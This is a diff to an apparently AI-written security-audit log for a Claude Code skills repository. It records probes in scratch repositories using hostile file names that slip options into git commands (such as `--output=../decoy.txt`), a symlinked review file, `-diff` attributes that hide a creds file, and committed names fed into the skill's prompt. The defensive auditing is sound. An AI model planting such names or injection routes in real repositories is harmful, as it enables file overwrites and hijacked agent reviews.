-  backtick span, and a symlinked CODEREVIEW.md, followed by `codereview-marker surface`,
-  `codereview-marker uncommitted`, `git status --porcelain`, and a heredoc write to the link;
-  `git log -p --follow -3 --output=<file>` against an 8-byte scratch file; `bash --norc
-  --noprofile` sourcing review-shaped markdown whose only command was a `touch` in the scratchpad.
-  Also read: ~/.claude/settings.json (no sandbox block, defaultMode auto, classifyAllShell true),
-  /etc/skel/.bashrc, and a count of CODEREVIEW.md writes in zat.env session transcripts from the
-  last 14 days (5 Write and 26 Edit calls, all in subagent transcripts that mention /codereview;
-  no `> CODEREVIEW.md <<` heredoc). No suite ran, no probe named a push, and no network call was
-  made.
+- Read in full: claude/skills/codereview/SKILL.md (774 lines), claude/skills/security/SKILL.md
+  (259; it is this scan's prompt), and CLAUDE.md (82). tests/lint-skills.sh (2,182) was read
+  through its diff since e3b6b5f (lines 1133-1136 and 1589-1604), its helpers (lines 1-43), the
+  REVIEW_TIMEOUT extraction (lines 1264-1279), and its shellcheck and frontmatter sections (lines
+  2030-2110), with a grep of every write, exec, and interpreter call. Each file's diff since e3b6b5f
+  was read; 38e6c73 and 9afc578 are the commits that touch them.
+- Read outside the scope to trace findings: bin/codereview-marker lines 55-75 and 95-215;
+  bin/spec-backlog-apply.sh lines 56-66 and 152-166; claude/skills/codefix/SKILL.md lines 25-80;
+  claude/skills/pr/SKILL.md lines 178-215; README.md lines 19, 80-81, 253, and 818-842; SECURITY.md
+  at 8d5ff93 (the five /codereview NOTEs' full text) and the history of SECURITY.md for earlier
+  coverage of the built-in review and of `--text`; ~/.claude/settings.json (hook registrations,
+  defaultMode auto, classifyAllShell true, no sandbox block); the ~/.claude/skills links (the
+  zat.env skills resolve to this checkout); ~/.config/claude-reviewers (700 and 600, no provider
+  key set); /etc/skel/.bashrc.
+- Probes, writing only to a new scratchpad directory (sec-probe-1113, left in place): `git log -p
+  --follow -3 --output=<file>` against an 8-byte file, with and without `--`; a scratch repo that
+  committed `--output=../decoy.txt`, a name holding a backtick span, files named `post-fix` and
+  `--`, and a symlinked CODEREVIEW.md, followed by the history template pasted bare,
+  `codereview-marker surface`, `codereview-marker uncommitted`, `git status --porcelain`, and a
+  heredoc write to the link; a second scratch repo with `-diff` attributes on app.py and creds.txt,
+  read with `git diff`, `git diff --numstat`, `git log -p --follow -3`, and `--text`; `git
+  check-ref-format --branch` on seven names. No suite ran, no probe named a push, and no network
+  call was made.
 - Checked and not findings:
-  - e3b6b5f's carried-mark wording, its lint pin (a fixed `grep -qE --` pattern that matches line
-    161), and CLAUDE.md's time figures change no command, grant, or trust decision. CLAUDE.md line
-    60 matches the skill's foreground and no-suite rules and their lint pins (lines 1117-1123).
+  - 9afc578 lowers /codereview's frontmatter effort from xhigh to high (codereview SKILL.md:15,
+    CLAUDE.md:54) with lint pins. It changes review depth, not a grant, a gate, or a trust
+    decision, and /security stays at max.
+  - 38e6c73 names `; carried, not re-checked` literally in the in-scope re-check (security
+    SKILL.md:161) and the post-fix update (line 212), with lint pins: bookkeeping only.
   - tests/lint-skills.sh is still a static checker: grep, awk, shellcheck (which reads scripts and
-    does not run them), and a fixed `python3 -c` program that calls `yaml.safe_load`. `python3 -c`
-    puts the working directory on sys.path, so a `yaml.py` where lint runs would load; anyone who
-    can put one in zat.env can edit lint itself.
+    does not run them), and a fixed `python3 -c` program that calls `yaml.safe_load`. The values it
+    does arithmetic on are digit-only greps (lines 1268-1274). `python3 -c` puts the working
+    directory on sys.path and tests/run-all.sh does not change directory, so a `yaml.py` where lint
+    runs would load; run from zat.env, as CLAUDE.md:33 says, anyone who can add one can edit lint
+    itself.
   - CLAUDE.md holds no instruction that widens a grant or skips a gate.
-  - The carried NOTE on out-of-diff fixes cites security SKILL.md:142-145 as a link in its chain. At
-    HEAD the carry rule is lines 163-168, and the link holds: a carried WARN keeps its full text,
-    remediation included.
-  - The security skill's `Bash(*)` grant (line 11) is the class the prior entry described, to which
-    the /spec grant NOTE's remediation (narrow the grant) applies; the file-name NOTE above records
-    the new route into it.
-- Not verified: a live model's handling of a hostile file name or of a refused write; a symlink
-  target outside the project; Claude Code before 2.1.311; Windows and macOS.
+  - The codereview skill's temporary files come from mktemp (lines 174, 491, 525); Step 2's
+    PRIOR_* values print through command substitution and are never evaluated again; Step 7 pastes
+    only the hex sha that `git stash create` prints.
+  - Step 5.6's `claude -p` child is a new session in the repository, so it reads the checked-out
+    `.claude/settings.json`, hooks included, at its own start. Step 3 runs the same tree's test
+    suite before it, so a committer who could plant such a hook gains nothing Step 3 does not
+    already give. How `-p` treats workspace trust was not checked.
+  - Several NOTEs assume a committer whose commits the user pulls. /codereview's Step 3
+    (claude/skills/codereview/SKILL.md:365-374) runs the checked-out test suite before Step 4 reads
+    the diff, so such a committer's code already runs whenever a review does, and those NOTEs
+    describe quieter routes. The file-name and symlink NOTEs also reach a standalone /security
+    audit of someone else's repository, which runs nothing from it.
+- Not verified: a live model's handling of a hostile file name or of a refused write; Claude Code
+  before 2.1.311; Windows and macOS.
 
-Git history checked for secrets: `git log -p --follow -3 --` for each of the three files (commits
-e3b6b5f, 9787b0b, c5bf5e6, and b8746a8), pattern-scanned for OpenAI, Anthropic, Google, GitHub,
-GitLab, AWS, Slack, Hugging Face, npm, and Tailscale keys, private-key headers, and generic key,
-token, secret, and password assignments. No hits. None of the three files handles credentials.
-PII: none in the three files (email, name, and phone patterns).
+Git history checked for secrets: `git log -p --text --follow -3 --` for each of the four files
+(commits 9afc578, 38e6c73, e3b6b5f, 9787b0b, b8746a8, and 03aacf2), pattern-scanned for OpenAI,
+Anthropic, Google, GitHub, GitLab, AWS, Slack, Hugging Face, npm, and Tailscale keys, private-key
+headers, and generic key, token, secret, and password assignments. No hits. None of the four files
+handles credentials, and none carries a `diff` or `binary` attribute. PII: none in the four files
+(email, phone, and name patterns).
 
 No marker was written. zat.env's tree was not changed apart from this file.
 
@@ -443,10 +582,9 @@ No marker was written. zat.env's tree was not changed apart from this file.
   above); /codereview external has no such check.
 
 ---
-*Prior review (2026-11-12, scope: paths, at 721b632): the four files `codereview-marker surface
-1d1b5da` listed (CLAUDE.md, the codefix and security skills, tests/lint-skills.sh); 0 BLOCK / 1 WARN
-/ 27 NOTE, no secrets. It added three NOTEs (the secret-history command's unquoted path, /codefix
-reading CODEREVIEW.md's carried-forward block, and re-checks of condensed NOTEs) and rewrote
-SECURITY.md under the Status-line and condensed-NOTE rules.*
+*Prior review (2026-11-12, scope: paths, at e3b6b5f): the three files `codereview-marker surface
+721b632` listed (CLAUDE.md, the security skill, tests/lint-skills.sh); 0 BLOCK / 1 WARN / 29 NOTE,
+no secrets. It re-checked the security skill's two NOTEs and added two: committed file names
+substituted into the skill's own prompt, and review files committed as symlinks.*
 
-<!-- SECURITY_META: {"date":"2026-11-12","commit":"e3b6b5fd4e774a1b6845052e965177151f4aa9ed","scope":"paths","scanned_files":["CLAUDE.md","claude/skills/security/SKILL.md","tests/lint-skills.sh"],"block":0,"warn":1,"note":29} -->
+<!-- SECURITY_META: {"date":"2026-11-13","commit":"9afc5789ccd64d0988e730bc73ff6e826c97bce8","scope":"paths","scanned_files":["CLAUDE.md","claude/skills/codereview/SKILL.md","claude/skills/security/SKILL.md","tests/lint-skills.sh"],"block":0,"warn":1,"note":30} -->
